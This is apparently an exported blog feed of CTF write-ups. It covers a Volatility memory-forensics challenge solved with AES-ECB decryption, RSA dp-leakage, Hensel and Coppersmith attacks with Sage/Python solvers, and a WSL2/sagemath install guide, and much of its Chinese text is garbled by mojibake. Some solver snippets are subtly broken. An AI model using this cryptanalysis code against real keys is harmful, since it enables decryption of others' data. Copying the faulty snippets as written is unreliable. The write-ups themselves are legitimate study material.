<p>ä¸»è¦ä½¿ç”¨äº†<code>Win2003SP</code>ï¼Œæ ¹æ®å°è¯•ï¼Œå‘ç°<code>Win2003SP0x86</code>æ— æ³•è¯»å–ç›¸å…³çš„æ•°æ®ï¼Œæ‰€ä»¥ä¸»è¦é€‰æ‹©<code>Win2003SP1x86</code>ç­‰è¿›è¡Œå†…å­˜å–è¯ã€‚</p>
<ol start="2">
<li>ä½¿ç”¨<code>vol.py -f memory.img --profile=Win2003SP1x86 sptree</code>æŸ¥çœ‹è¿›ç¨‹ã€‚å‘ç°ä¸¤ä¸ªå¯ç–‘è¿›ç¨‹<code>ctfmoon.exe</code>å’Œ<code>DumpIt.exe</code>,<code>ctfmoon.exe</code>è¿›ç¨‹ç›¸å¯¹ä¹…è¿œï¼Œä¼˜å…ˆæŸ¥çœ‹<code>DumpIt.exe</code>ã€‚</li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220825104239959.png" class="" title="image-20220825104239959">

<p><code>DumpIt.exe</code>ä¸»è¦æ˜¯ç”¨æ¥å†…å­˜å–è¯çš„å·¥å…·ï¼Œé‚£ä¸»è¦çš„æ€è·¯å°±æ˜¯æŸ¥çœ‹å®ƒä¸»è¦åšäº†å“ªäº›å·¥ä½œã€‚</p>
<ol start="3">
<li>ä½¿ç”¨<code>screenshot</code>æŸ¥çœ‹<code>vol.py -f memory.img --profile=Win2003SP1x86 screenshot --dump-dir=./</code></li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220825111632586.png" class="" title="image-20220825111632586">

<ol start="4">
<li>å‘ç°äº†<code>flag.png</code>ï¼Œæ­¤æ—¶ä¸»è¦æŸ¥æ‰¾ç›¸å…³çš„flag<code>vol.py -f memory.img --profile=Win2003SP1x86 filescan | grep flag </code></li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220825111809842.png" class="" title="image-20220825111809842">

<ol start="5">
<li><code>vol.py -f memory.img --profile=Win2003SP1x86 dumpfiles -Q 0x000000000484f900 -D ./ -u</code></li>
</ol>
<p>æŠŠ<code>flag</code>ç›¸å…³ç»™å¯¼å…¥æ•°æ®ï¼Œæœ€åå¾—åˆ°<code>00.dat</code>ã€‚</p>
<p>äºŒç»´ç æ‰«ä¸€æ‰«å‘ç°ä¸€æ®µç–‘ä¼¼<code>base64</code>å¯†æ–‡ã€‚ä½†è§£å¯†æ²¡å¾—åˆ°æœ‰ç”¨æ•°æ®ï¼Œäºæ˜¯ç»§ç»­ä»åˆ«çš„æ¸ é“æŸ¥çœ‹ã€‚</p>
<ol start="6">
<li>æŸ¥çœ‹æ‰“å¼€äº†å“ªäº›è½¯ä»¶ä»¥åŠå…·ä½“æ“ä½œ<code>vol.py -f memory.img --profile=Win2003SP1x86 windows</code></li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220825132746976.png" class="" title="image-20220825132746976">

<p>Pid:1992ï¼Œä½¿ç”¨å›¾ç‰‡å’Œä¼ çœŸæŸ¥çœ‹å™¨æŸ¥çœ‹äº†<code>flag.png</code>ã€‚</p>
<ol start="7">
<li><p>ç„¶åæˆ‘ä»¬æŠŠè¿™äº›ç›¸å…³æ•°æ®ç»™å¯¼å‡º<code> vol.py -f memory.img --profile=Win2003SP1x86 memdump -p 1992 -D ./</code>ï¼Œä»è€Œå¾—åˆ°<code>1992.dmp</code></p>
</li>
<li><p>æˆ‘ä»¬å¾—åˆ°<code>1992.dmp</code>åï¼Œåˆ©ç”¨<code>foremost 1992.dmp</code>æŠŠéšè—å…¶ä¸­çš„ç›¸å…³æ•°æ®ç»™å¯¼å‡º</p>
</li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220825133104198.png" class="" title="image-20220825133104198">

<img src="/2023/03/09/MISC-Write-Up-zh/image-20220825133126952.png" class="" title="image-20220825133126952">

<p>é‡Œé¢å‘ç°è¿™äº›å›¾ç‰‡ã€‚</p>
<p>äºŒç»´ç å°±æ˜¯ä¹‹å‰åˆ†ç¦»å‡ºæ¥çš„ï¼Œæ‰«å‡ºæ¥æ˜¯<code>jfXvUoypb8p3zvmPks8kJ5Kt0vmEw0xUZyRGOicraY4=</code>ï¼Œè€Œå¦ä¸€å¼ å›¾æ˜¾ç¤º<code>key:Th1s_1s_K3y00000</code>ä»¥åŠ<code>iv:1234567890123456</code>ã€‚å‡ºç°IV+å¯†æ–‡ä¹Ÿæ˜¯base64å½¢å¼ã€‚æ‰€ä»¥è€ƒè™‘æ˜¯å¦è¿›è¡Œäº†AESåŠ å¯†ã€‚</p>
<ol start="9">
<li>å¯¹å¯†æ–‡è¿›è¡ŒAESè§£å¯†ï¼Œå› ä¸ºå‘Šè¯‰äº†IVæ‰€ä»¥ä¸»è¦è€ƒè™‘æ˜¯ä¸æ˜¯é™¤äº†ECBä»¥å¤–çš„æ¨¡å¼ï¼Œä½†æœ€ç»ˆå…¶å®å°±æ˜¯ECBæ¨¡å¼çš„AESè§£å¯†ã€‚ï¼ˆæ‰€ä»¥è¿™ä¸€æ­¥å¾ˆè¿·ï¼Œç»™çš„IVéš¾é“å°±åªæ˜¯æç¤ºAESï¼Ÿï¼‰</li>
</ol>
<blockquote>
<p>AESè§£å¯†ï¼š<a href="http://tool.chacuo.net/cryptaes">åœ¨çº¿AESåŠ å¯†è§£å¯†ã€AESåœ¨çº¿åŠ å¯†è§£å¯†ã€AES encryption and decryptionâ€“æŸ¥é”™ç½‘ (chacuo.net)</a></p>
</blockquote>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220825133644181.png" class="" title="image-20220825133644181">

<p>æœ€åå¾—åˆ°å¯†æ–‡<code>flag&#123;F0uNd_s0m3th1ng_1n_M3mory&#125;</code></p>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>recurrent</tag>
      </tags>
  </entry>
  <entry>
    <title>Weekly-Descriptions-About-Crypto</title>
    <url>/2023/02/22/weekly-descriptions-about-crypto/</url>
    <content><![CDATA[<p>The <code>dp_leakage</code> in RSA attacks, the post will introduce some extensions about the <code>dp_leakage</code>, using the example <code>[2020YCB]Power</code>.</p>
<p>Next part will resolve the <code>[2022MIMIC]cry1</code> which is more easier than the former wp. The former by using <code>polynomial</code>, the latter by using <code>math deduction</code> with <code>fermat_little_theorem</code>. </p>
<p>Both of them will be given full solutions and comparison.</p>
<span id="more"></span><!--toc-->

<h1 id="DP-LEAKAGE-EXTENSIONS"><a href="#DP-LEAKAGE-EXTENSIONS" class="headerlink" title="DP_LEAKAGE_EXTENSIONS"></a>DP_LEAKAGE_EXTENSIONS</h1><h2 id="EX1-n-x3D-p-b-cdot-q"><a href="#EX1-n-x3D-p-b-cdot-q" class="headerlink" title="EX1: $n &#x3D; p^{b}\cdot q$"></a>EX1: $n &#x3D; p^{b}\cdot q$</h2><blockquote>
<p>[2020YCB]Power</p>
</blockquote>
<img src="/2023/02/22/weekly-descriptions-about-crypto/hense_lifting.png" class="" title="hense_lifting">

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">dp_hensel</span>(<span class="params">c, e, dp, p, b</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    :param b: p^b*q</span></span><br><span class="line"><span class="string">    :return: m</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    mp_ = <span class="built_in">pow</span>(c, dp, p)</span><br><span class="line">    mp = <span class="built_in">pow</span>(c, dp - <span class="number">1</span>, p)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, b - <span class="number">2</span>):</span><br><span class="line">        x = <span class="built_in">pow</span>(c - <span class="built_in">pow</span>(mp_, e), <span class="number">1</span>, p**(i + <span class="number">1</span>))</span><br><span class="line">        y = <span class="built_in">pow</span>(x * mp * invert(e, p), <span class="number">1</span>, p**(i + <span class="number">1</span>))</span><br><span class="line">        mp_ = mp_ + y</span><br><span class="line">    <span class="keyword">return</span> mp_</span><br></pre></td></tr></table></figure>

<h2 id="EX2-Coppersmith-attack-know-dp-high"><a href="#EX2-Coppersmith-attack-know-dp-high" class="headerlink" title="EX2: Coppersmith attack, know dp high"></a>EX2: Coppersmith attack, know dp high</h2><blockquote>
<p>[qwb2019]Coppersmith</p>
</blockquote>
<img src="/2023/02/22/weekly-descriptions-about-crypto/coppersmith-high.png" class="">

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#Sage</span><br><span class="line">dp0 = </span><br><span class="line">e = </span><br><span class="line">n = </span><br><span class="line"></span><br><span class="line">F.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">d = inverse_mod(e, n)</span><br><span class="line">for k in range(1, e):</span><br><span class="line">	f = (secret &lt;&lt; 200) + x + (k - 1) * d # 200 editable</span><br><span class="line">	x0 = f.small_roots(X=2 ** (200 + 1), beta=0.44, epsilon=1/32)</span><br><span class="line">	if len(x0) != 0:</span><br><span class="line">		dp = x0[0] + (secret &lt;&lt; 200)</span><br><span class="line">		for i in range(2, e):</span><br><span class="line">			p = (e * Integer(dp) - 1 + i) // i</span><br><span class="line">			if n % p == 0:</span><br><span class="line">				break</span><br><span class="line">		if p &lt; 0:</span><br><span class="line">			continue</span><br><span class="line">		else:</span><br><span class="line">			print(&#x27;k = &#x27;,k)</span><br><span class="line">			print(&#x27;p = &#x27;,p)</span><br><span class="line">			print(&#x27;dp = &#x27;,dp)</span><br><span class="line">			break</span><br></pre></td></tr></table></figure>

<h2 id="EX3-p-x3D-gcd-m-e-cdot-dp-m-n"><a href="#EX3-p-x3D-gcd-m-e-cdot-dp-m-n" class="headerlink" title="EX3: $p &#x3D; gcd(m^{e\cdot dp} - m, n)$"></a>EX3: $p &#x3D; gcd(m^{e\cdot dp} - m, n)$</h2><img src="/2023/02/22/weekly-descriptions-about-crypto/gcd.png" class="">

<h2 id="TBC"><a href="#TBC" class="headerlink" title="TBC"></a>TBC</h2><h1 id="2020YCB-Power"><a href="#2020YCB-Power" class="headerlink" title="[2020YCB]Power"></a>[2020YCB]Power</h1><p><a href="weekly-descriptions-about-crypto/Power.py">Power.py</a></p>
<h2 id="factorize-n-to-get-p"><a href="#factorize-n-to-get-p" class="headerlink" title="factorize $n$ to get $p$"></a>factorize $n$ to get $p$</h2><h3 id="solution1-limit"><a href="#solution1-limit" class="headerlink" title="solution1-limit"></a>solution1-limit</h3><p><strong>Use the bit_length of $p$ to limit.</strong> We can get the equation of $num &#x3D; dp \times e - 1$, and the numâ€™s bit_length is 526, meaning that num contains some excess factors. We divide these small factors and we will get the true $p$, whose bit_length is 512. </p>
<p>We use <code>yafu</code> to make a factorization. </p>
<p><strong>Deduction:</strong><br>$$<br>\varphi(n) &#x3D; lcm(p-1, q-1) &#x3D; k_1(p-1) \cdot k_2(q-1)<br>$$</p>
<p>$$<br>d \times e \equiv 1 \mod \varphi(n) \equiv 1 \mod (p-1)<br>$$</p>
<p>$$<br>dp \equiv d \mod (p-1)<br>$$</p>
<p>$$<br>\Longrightarrow dp\times e \equiv 1 \mod (p-1)<br>$$</p>
<p>Meaning that $num &#x3D; dp \times e - 1 &#x3D; k(p-1)$, we limit the bit_length to 512, and we will get the key equation of $p &#x3D; num + 1$</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">factor:</span></span><br><span class="line"><span class="string">P1 = 2 # 1 digits</span></span><br><span class="line"><span class="string">P1 = 2</span></span><br><span class="line"><span class="string">P1 = 2</span></span><br><span class="line"><span class="string">P2 = 11 # 2</span></span><br><span class="line"><span class="string">P4 = 7411 # 4</span></span><br><span class="line"><span class="string">P14 = 10402958442703 # 14</span></span><br><span class="line"><span class="string">P17 = 25388174482857437 # 17</span></span><br><span class="line"><span class="string">P23 = 19976951634728916570101 # 23</span></span><br><span class="line"><span class="string">P33 = 121098273308863403811867260913043 # 33</span></span><br><span class="line"><span class="string">P69 = 514664028984426592785192432611128951474323755859087258008037664208623 # 69</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">p = num // <span class="number">7411</span> // <span class="number">2</span> // <span class="number">2</span> + <span class="number">1</span></span><br><span class="line"><span class="comment"># judgement conditions</span></span><br><span class="line"><span class="comment"># 1. the bit_length 512 ?</span></span><br><span class="line"><span class="comment"># 2. p is prime ?</span></span><br></pre></td></tr></table></figure>

<h3 id="solution2-root"><a href="#solution2-root" class="headerlink" title="solution2-root"></a>solution2-root</h3><p><strong>Use the equation of $x &#x3D; 2019\times p^{2} + 2020\times p^{3} + 2021\times p^{4}$ ,  which is given by <code>Power.py</code> .</strong>  We can also see clearly from the <code>Power.py</code> that it use <code>discrete log</code> to generate $g_1$, by using $x, y, g$.</p>
<p>So the steps to solve $p$: </p>
<ul>
<li><strong><code>discrete_log(y, c1, g)</code> to solve out $x$</strong> (more important)</li>
<li><code>equations</code> to solve out $p$, the root of the equation is $p$</li>
</ul>
<p><em>The real $p$ is defined in $GF(y)$</em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># step1</span><br><span class="line">x = discrete_log(y, c1, g)</span><br><span class="line"># x =</span><br><span class="line"></span><br><span class="line"># step2</span><br><span class="line">p = var(&#x27;p&#x27;)</span><br><span class="line">R.&lt;p&gt; = PolynomialRing(GF(y))</span><br><span class="line">f = 2019*p**2 + 2020*p**3 + 2021*p**4 - x</span><br><span class="line">f.roots()</span><br><span class="line"># p = </span><br></pre></td></tr></table></figure>

<h3 id="solution3-crack"><a href="#solution3-crack" class="headerlink" title="solution3-crack"></a>solution3-crack</h3><p>Just crack by using the $dp, e, x, y, c1$. </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,e+<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span> (dp*e-<span class="number">1</span>)%x==<span class="number">0</span>:</span><br><span class="line">        p=(dp*e-<span class="number">1</span>)//x+<span class="number">1</span></span><br><span class="line">        x = <span class="number">2019</span>*p**<span class="number">2</span> + <span class="number">2020</span>*p**<span class="number">3</span> + <span class="number">2021</span>*p**<span class="number">4</span></span><br><span class="line">        <span class="keyword">if</span> c1 == <span class="built_in">pow</span>(g, x, y):</span><br><span class="line">            <span class="built_in">print</span>(p)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h2 id="solve-out-m"><a href="#solve-out-m" class="headerlink" title="solve out $m$"></a>solve out $m$</h2><h3 id="solution1-deduce"><a href="#solution1-deduce" class="headerlink" title="solution1-deduce"></a>solution1-deduce</h3><p><strong>Use <code>fermat_little_theorem</code> to deduce.</strong> From the definition of $c$.<br>$$<br>c \equiv m^{e} \mod n<br>$$</p>
<p>$$<br>dp \equiv d \mod (p-1)<br>$$</p>
<p>$$<br>\rightarrow c^{dp} \equiv m^{dp \cdot e}\mod n<br>$$</p>
<p>$$<br>\Longrightarrow \exists k \in \mathbb{Z}, c^{dp}\mod p &#x3D; m^{k\cdot (p-1) + 1} \mod p<br>$$</p>
<p><code>Fermat&#39;s little theorem</code> can get the equation of $m^{\varphi(p)}\mod p \equiv 1$.<br>$$<br>\Longrightarrow m \cdot m^{k\cdot(p-1)}\mod p \equiv c^{dp} \mod p<br>$$</p>
<p>$$<br>\Longrightarrow m \equiv c^{dp} \mod p<br>$$</p>
<p>So we can run this easy code to get $m$.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">m = <span class="built_in">pow</span>(c, dp, p)</span><br></pre></td></tr></table></figure>

<h3 id="solution2-hensel"><a href="#solution2-hensel" class="headerlink" title="solution2-hensel"></a>solution2-hensel</h3><p><strong>The $n &#x3D; p^{4}\times q$</strong>, which is satisfied the <code>hensel_lifting scheme</code>. The $b$ is 4. </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">m = <span class="built_in">int</span>(dp_hensel(c, e, dp, p, b))</span><br></pre></td></tr></table></figure>

<p>Over~</p>
<h1 id="2022MIMIC-cry1"><a href="#2022MIMIC-cry1" class="headerlink" title="[2022MIMIC]cry1"></a>[2022MIMIC]cry1</h1><p><a href="weekly-descriptions-about-crypto/cry1.py">cry1.py</a></p>
<blockquote>
<p>references: </p>
<ul>
<li>V&amp;N2020 Fast</li>
<li>REDHAT2019 Related</li>
</ul>
</blockquote>
<h2 id="part1"><a href="#part1" class="headerlink" title="part1"></a>part1</h2><p>To solve out the $p$ and $q$, we ought to make a deduction about the encrypt code. </p>
<p><strong>Known:</strong><br>$$<br>g_1 &#x3D; g^{(p-1) \cdot r_1}\mod p<br>$$</p>
<p>$$<br>c_1 \equiv (m \times g_1^{s_1} \mod N )\mod N<br>$$</p>
<p><strong>Deduction:</strong> <code>fermat_little_theorem</code><br>$$<br>g_1 &#x3D; g^{(p-1)\cdot r1} \mod p \equiv 1<br>$$</p>
<p>$$<br>\Longrightarrow g_1 - 1 &#x3D; k\cdot p<br>$$</p>
<p>The $N &#x3D; p\times q$, thus we can get $p$ by $gcd(g_1-1, N)$. </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = gcd(g1 - <span class="number">1</span>, N)</span><br><span class="line">q = N // p</span><br></pre></td></tr></table></figure>

<h3 id="solution1-crt"><a href="#solution1-crt" class="headerlink" title="solution1-crt"></a>solution1-crt</h3><p>Write the decrypt code by using <code>chinese_remainder_theorem</code>. </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">c1, c2, p, q</span>):</span><br><span class="line">    xp = c1 % p</span><br><span class="line">    xq = c2 % q</span><br><span class="line">    <span class="comment"># Chinese Remainder Theorem</span></span><br><span class="line">    m = (xp*invert(q, p)*q + xq*invert(p, q)*p) % (p*q)</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"><span class="comment"># or sagemath-crt()</span></span><br><span class="line">m = crt([c1, c2], [p, q])</span><br></pre></td></tr></table></figure>

<h3 id="solution2-min"><a href="#solution2-min" class="headerlink" title="solution2-min"></a>solution2-min</h3><p>$$<br>c_1 \equiv (m \times g^{s_1 \cdot r_1  \cdot (p-1)} \mod p) \mod N\<br>\Longrightarrow c_1 \equiv m \mod N<br>$$</p>
<p>By equation above, we can get a simple way to solve out $m$, for that the bit_length of $m$ is short theoretically.<br>$$<br>m &#x3D; min(c1 \mod p, c1 \mod q)<br>$$<br>Convert to code.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">m = min(c1 % p, c1 % q)</span><br></pre></td></tr></table></figure>

<h2 id="part2"><a href="#part2" class="headerlink" title="part2"></a>part2</h2><p>Three equations of <code>A</code>, <code>B</code>, <code>C</code>. </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cnt = <span class="built_in">len</span>(Cs)</span><br><span class="line">A = [(i + <span class="number">128</span>)**<span class="number">2</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(cnt)]</span><br><span class="line">B = [(i + <span class="number">1024</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(cnt)]</span><br><span class="line">C = [(i + <span class="number">512</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(cnt)]</span><br></pre></td></tr></table></figure>



<h3 id="solution1-Groebner-basis"><a href="#solution1-Groebner-basis" class="headerlink" title="solution1-Groebner_basis"></a>solution1-Groebner_basis</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">PR = PolynomialRing(Zmod(N2), <span class="string">&#x27;x&#x27;</span>, cnt)</span><br><span class="line">x = PR.gens()</span><br><span class="line">Fs = [((A[i] * x[i]**<span class="number">2</span> + B[i] * x[i] + C[i])**e - Cs[i]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(cnt)]</span><br><span class="line">Fs.append(x[<span class="number">0</span>] + x[<span class="number">1</span>] + x[<span class="number">2</span>] - S)</span><br><span class="line">I = Ideal(Fs)</span><br><span class="line">G_b = I.groebner_basis()</span><br><span class="line">m2 = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> G_b[:-<span class="number">1</span>]:</span><br><span class="line">    mi = ZZ(-b(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">    mi = <span class="built_in">hex</span>(mi)[<span class="number">2</span>:].strip(<span class="string">&#x27;L&#x27;</span>)</span><br><span class="line">    m2 += ((<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;0&#x27;</span>)[<span class="built_in">len</span>(mi) %<span class="number">2</span>]+mi)</span><br><span class="line"><span class="comment"># m is hex</span></span><br></pre></td></tr></table></figure>

<p>TBC~</p>
<h3 id="solution2-functions"><a href="#solution2-functions" class="headerlink" title="solution2-functions"></a>solution2-functions</h3><p>We are similar to the polynomial equations, thus we make a conversion. </p>
<p>Get the quadradic equations by open to the power of e.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">C_ = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> Cs:</span><br><span class="line">    C_.append(iroot(i, Cs)[<span class="number">0</span>])</span><br></pre></td></tr></table></figure>

<p>Unknown variables  $m1, m2, m3$defined on the ring of $\mathbb{Z}$ .</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">P.&lt;m1&gt; = Zmod()[]</span><br><span class="line">P.&lt;m2&gt; = Zmod()[]</span><br><span class="line">P.&lt;m3&gt; = Zmod()[]</span><br></pre></td></tr></table></figure>

<p>Substitute the former equations, and get the quadradic equations. </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f1 = A[<span class="number">0</span>] * m1 ** <span class="number">2</span> + B[<span class="number">0</span>] * m1 + C[<span class="number">0</span>] - <span class="built_in">int</span>(C_[<span class="number">0</span>])</span><br><span class="line">f2 = A[<span class="number">1</span>] * m2 ** <span class="number">2</span> + B[<span class="number">1</span>] * m2 + C[<span class="number">1</span>] - <span class="built_in">int</span>(C_[<span class="number">1</span>])</span><br><span class="line">f3 = A[<span class="number">2</span>] * m3 ** <span class="number">2</span> + B[<span class="number">2</span>] * m3 + C[<span class="number">2</span>] - <span class="built_in">int</span>(C_[<span class="number">2</span>])</span><br></pre></td></tr></table></figure>

<p>Get the root. </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">v1 = f1.roots()</span><br><span class="line">v2 = f2.roots()</span><br><span class="line">v3 = f3.roots()</span><br></pre></td></tr></table></figure>





<h1 id="coppersmithè¾¹ç•Œé—®é¢˜"><a href="#coppersmithè¾¹ç•Œé—®é¢˜" class="headerlink" title="coppersmithè¾¹ç•Œé—®é¢˜"></a>coppersmithè¾¹ç•Œé—®é¢˜</h1><blockquote>
<p><a href="https://blog.csdn.net/qq_51999772/article/details/123620932">RSAä¸­coppersmithå®šç†çš„åº”ç”¨æ¡ä»¶_small_roots_M3ng@Lçš„åšå®¢-CSDNåšå®¢</a></p>
</blockquote>
<img src="/2023/02/22/weekly-descriptions-about-crypto/image-20230803144033492.png" class="" title="image-20230803144033492">

<img src="/2023/02/22/weekly-descriptions-about-crypto/image-20230803144106079.png" class="" title="image-20230803144106079">

<img src="/2023/02/22/weekly-descriptions-about-crypto/image-20230803144137890.png" class="" title="image-20230803144137890">

<img src="/2023/02/22/weekly-descriptions-about-crypto/image-20230803144155489.png" class="" title="image-20230803144155489">

<img src="/2023/02/22/weekly-descriptions-about-crypto/image-20230803144224670.png" class="" title="image-20230803144224670">

<img src="/2023/02/22/weekly-descriptions-about-crypto/image-20230803144334288.png" class="" title="image-20230803144334288">



<ul>
<li><p>åœ¨<code>sagemath</code>ä¸­åº”ç”¨<code>coppersmith</code>å®šç†çš„å‡½æ•°æœ‰ä¸¤ä¸ªï¼š<code>small_roots</code>ï¼Œ <code>coppersmith_howgrave_univariate</code>ã€‚</p>
</li>
<li><p>è¿™é‡Œæ±‚è§£coppersmithæˆ‘ä»¬ç»Ÿä¸€ä½¿ç”¨sagemathçš„<code>small_roots()</code>å‡½æ•°ï¼›è¯¥å‡½æ•°å¯¼å…¥çš„ $\beta$èµ·ä½œç”¨çš„åªæœ‰ä¸€ä½å°æ•°ï¼ˆå¦‚æœæ˜¯ä¸¤ä½å°æ•°ï¼Œå…¶æ±‚è§£èŒƒå›´è¿˜æ˜¯ç›¸å½“äºä¸€ä½å°æ•°çš„æ±‚è§£èŒƒå›´ï¼‰ï¼Œè¿™å°±æ„å‘³ç€ä¸€èˆ¬å½¢å¦‚<code>p = getPrime(bits)</code>,<code>q = geyPrime(bits)</code>çš„RSAåº”ç”¨<code>coppersmith</code>æ±‚è§£$p$çš„ä½ä½æ—¶ï¼Œ$\beta$åªèƒ½æ˜¯æœ€æ¥è¿‘$0.5$ çš„$0.4$ã€‚</p>
</li>
</ul>
<p>å…³äº<code>small_roots()</code>çš„ä½¿ç”¨æ–¹æ³•ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">small_roots(X = ,beta = ) æœ‰ä¸¤ä¸ªå‚æ•°</span><br></pre></td></tr></table></figure>

<p>$X$ä»£è¡¨æ‰€éœ€è¦æ±‚è§£æ ¹çš„ä¸Šé™ï¼›è™½ç„¶æ˜¯æ ¹çš„ä¸Šé™ï¼Œå¹¶ä¸æ˜¯è¯´ä¸Šé™è¶Šé«˜è¶Šå¥½ï¼Œå½“ä¸Šé™è¶…è¿‡æŸä¸ªå€¼çš„æ—¶å€™å°±ä¼šè®¡ç®—å¤±æ•ˆï¼Œå³ä½¿å·²çŸ¥äºŒè¿›åˆ¶ä½æ•°æ»¡è¶³æ¡ä»¶ï¼Œä¹Ÿæ— æ³•ç”¨æ­¤å‡½æ•°æ±‚å¾—ç»“æœï¼›æ‰€ä»¥ä¸€èˆ¬æ¥è¯´$X$å–åœ¨ç»™å®šæƒ…å†µä¸‹çš„æœ€å¤§æ±‚è§£ä¸Šé™ã€‚</p>
<p>$beta$å³æ˜¯å‰é¢æåˆ°çš„$\beta$ ï¼Œå½“$p$,$q$äºŒè¿›åˆ¶ä½æ•°ç›¸åŒæ—¶ä¸€èˆ¬åªèƒ½å–$0.4$ï¼›å¦‚æœ$p$,$q$äºŒè¿›åˆ¶ä½æ•°ä¸åŒï¼Œå°±æŒ‰ç…§ä¹‹å‰çš„æ–¹æ³•å…·ä½“é—®é¢˜å…·ä½“åˆ†æã€‚</p>
<p>ç»è¿‡æµ‹è¯•å¾—åˆ°ï¼Œå½“æœªçŸ¥é‡å°äºç­‰äº$454bits$æ—¶ï¼ˆ$p$,$q$ä¸º$1024bits$ï¼‰ï¼Œcoppersmithå®šç†å¯ä»¥æ±‚è§£</p>
<p>ä¹‹åæ”¹å˜äº†$p$,$q$çš„å¤§å°ï¼Œç»è¿‡æµ‹è¯•å‘ç°ï¼Œå½“$p$,$q$åŒäºŒè¿›åˆ¶ä½æ•°æ—¶ï¼Œè¦ä½¿ç”¨<code>small_roots()</code>åº”ç”¨<code>coppersmith</code>å®šç†æ±‚è§£$n$çš„æŸä¸ªå› æ•°çš„ä½ä½ï¼Œéœ€è¦æ»¡è¶³æœªçŸ¥çš„äºŒè¿›åˆ¶ä½æ•°ä¸å› æ•°ä¹‹é—´çš„äºŒè¿›åˆ¶ä½æ•°çš„å…³ç³»æ˜¯ï¼š<br>$$<br>bits_{unknown} \div bits_{p} &lt; &#x3D; 0.44<br>$$</p>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>RSA</tag>
        <tag>fermat_little_theorem</tag>
        <tag>dp_leakage</tag>
        <tag>YCB</tag>
        <tag>MIMIC</tag>
        <tag>chinese_remainder_theorem</tag>
        <tag>Groebner_basis</tag>
      </tags>
  </entry>
  <entry>
    <title>LLL&#39;s Notes Study</title>
    <url>/2023/09/18/LLL-s-notes-Study/</url>
    <content><![CDATA[<span id="more"></span><!--toc-->
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>LLL</tag>
        <tag>note</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows11å®‰è£…wsl2ä»¥åŠsagemath</title>
    <url>/2024/03/19/Windows11%E5%AE%89%E8%A3%85wsl2%E4%BB%A5%E5%8F%8Asagemath/</url>
    <content><![CDATA[<p>æœ¬æ–‡ç« ä¸»è¦ä»‹ç»å¦‚ä½•ä½¿ç”¨wsl2å®‰è£…sagemathï¼Œå®é™…å®‰è£…çš„è¿‡ç¨‹ä¸­å‡ºç°ä¸€äº›é—®é¢˜ï¼Œå°†åŸºäºé‡åˆ°çš„é—®é¢˜æ¥è¡¥å……å¯¹åº”çš„è§£å†³æ–¹å¼ã€‚</p>
<span id="more"></span><!--toc-->
<blockquote>
<p><a href="https://learn.microsoft.com/zh-cn/windows/wsl/install">https://learn.microsoft.com/zh-cn/windows/wsl/install</a><br>
<a href="https://zhuanlan.zhihu.com/p/633782050">https://zhuanlan.zhihu.com/p/633782050</a><br>
<a href="https://www.cnblogs.com/ZimaBlue/p/18012277">https://www.cnblogs.com/ZimaBlue/p/18012277</a></p>
</blockquote>
<h1>å®‰è£…wsl2</h1>
<blockquote>
<p>å¿…é¡»è¿è¡Œ Windows 10 ç‰ˆæœ¬ 2004 åŠæ›´é«˜ç‰ˆæœ¬ï¼ˆå†…éƒ¨ç‰ˆæœ¬ 19041 åŠæ›´é«˜ç‰ˆæœ¬ï¼‰æˆ– Windows 11 æ‰èƒ½ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ã€‚</p>
</blockquote>
